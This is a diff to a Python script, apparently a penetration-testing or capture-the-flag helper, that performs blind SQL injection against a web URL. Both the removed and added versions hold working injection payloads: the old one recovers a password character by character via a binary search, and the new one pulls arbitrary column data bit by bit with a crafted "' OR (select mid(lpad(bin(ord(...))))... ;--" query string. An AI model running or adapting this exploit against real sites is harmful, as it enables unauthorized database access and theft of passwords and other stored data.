@@ -14,77 +14,68 @@
 #  You should have received a copy of the GNU General Public License
 #  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
-#  Copyright 2012 Yannick Méheut <useless (at) utouch (dot) fr>
+#  Copyright 2014 Yannick Méheut <useless (at) utouch (dot) fr>
 
 import sys
 import requests
 
-def injection(target_url, authorized_characters, string_when_success, length):
-	'''
-	This function will be performing the injection. It will do a binary search
-	on the authorized_characters.
-	* target_url: the URL where the injection will be performed
-	* authorized_characters: chars we'll test for the password
-	* string_when_success: the string we'll look for for the binary search outcome
-	* length: length of the password
-	The function will return the found password.
-	'''
+def injection(target_url, string, column, table, where, index):
+    '''
+    This function will be performing the injection. It will find each
+    character, bit by bit.
+    * target_url: the URL where the injection will be performed
+    * string: the string we'll look for for the binary search outcome
+    The function will return the found password.
+    '''
 
-	print('[wait] retrieving password:', end='\t')
-	sys.stdout.flush()
-	password = ''
-	ascii_password = ''
+    print('[wait] retrieving data:', end='\t')
+    sys.stdout.flush()
+    data = ''
+    i = 1
 
-	# While we don't have the entire password
-	while (len(password) < length):
-		# Parameters for the binary search
-		a, b = 0, len(authorized_characters) - 1
-		# old_c is used, cause we can't performan usual
-		# binary search (we can't test the equality)
-		c, old_c = 0, 0
+    # While we don't have the entire password
+    while True:
+        char = 0
+        for j in range(1,8):
+            # The injection performed here is URL-based
+            # To use another mean of injection (HTTP Headers, Cookies...)
+            # change the crafting between the hashtags
 
-		# We perform a binary search to find the right character
-		while (a < b):
-			old_c = c
-			c = int((a + b)/2)
+            #### CHANGE HERE
+            if '?' in target_url:
+                separator = '&'
+            else:
+                separator = '?'
 
-			if (c == old_c):
-				c += 1
+            url = target_url + separator + "u=' OR " + \
+                    "(select mid(lpad(bin(ord(mid({0},{1},1))),7,'0'),{2},1) " + \
+                    "from {3} {4} " + \
+                    "limit {5},1) = 1;-- &p=bla"
+            url = url.format(column, i, j, table, where, index)
 
-			tested_character = authorized_characters[c]
+            r = requests.get(url)
+            #### END OF CHANGE
 
-			# The injection performed here is URL-based
-			# To use another mean of injection (HTTP Headers, Cookies...)
-			# change the crafting between the hashtags
+            output = r.text
 
-			#### CHANGE HERE
-			if '?' in target_url:
-				separator = '&'
-			else:
-				separator = '?'
-			url = target_url + separator + 'id=0||password<CHAR({0}{1})'
-			url = url.format(ascii_password, ord(tested_character))
-			#### END OF CHANGE
+            # We seek which half of authorized_characters
+            # we should search in
+            if string in output:
+                char += 2**(6 - j + 1)
 
-			r = requests.get(url)
-			output = r.text
 
-			# We seek which half of authorized_characters
-			# we should search in
-			if string_when_success in output:
-				b = c - 1
-			else:
-				a = c
+        if char != 0:
+            # When we find a character, we display it on stdout
+            print(chr(char), end='')
+            sys.stdout.flush()
 
-		# When we find a character, we display it on stdout
-		new_character = authorized_characters[a]
-		print(new_character, end='')
-		sys.stdout.flush()
-		# We add it to the password
-		password += new_character
-		ascii_password += '{0},'.format(str(ord(new_character)))
+            # We add it to the existing data
+            data += chr(char)
+            i += 1
+        else:
+            break
 
-	print('\r[done]')
+    print('\r[done]')
 
-	return password
+    return data
 
